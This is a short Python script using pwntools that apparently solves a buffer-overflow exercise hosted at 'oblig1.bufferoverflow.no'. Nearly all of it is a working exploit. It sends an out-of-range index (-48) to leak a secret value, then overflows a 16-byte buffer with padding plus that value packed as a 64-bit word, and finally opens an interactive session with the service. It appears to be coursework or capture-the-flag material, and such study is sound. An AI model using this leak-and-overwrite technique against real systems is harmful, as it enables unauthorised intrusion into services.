import pwn

target = 'oblig1.bufferoverflow.no'
port = '7004'

bufferfill = b'A' * 16
buffer_to_secret_dst = b'-48'

p = pwn.remote(target, port)

print(p.recvline())
print(p.recvline())

p.send(buffer_to_secret_dst + b'\n')

print(p.recvline())

read_secret = p.recvline()
print(b'Secret: ' + read_secret)

secret_val = pwn.p64(int(read_secret, 16))

print(p.recvline())

p.send(bufferfill + secret_val + b'\n')

print(p.recvline())

p.interactive()
p.close()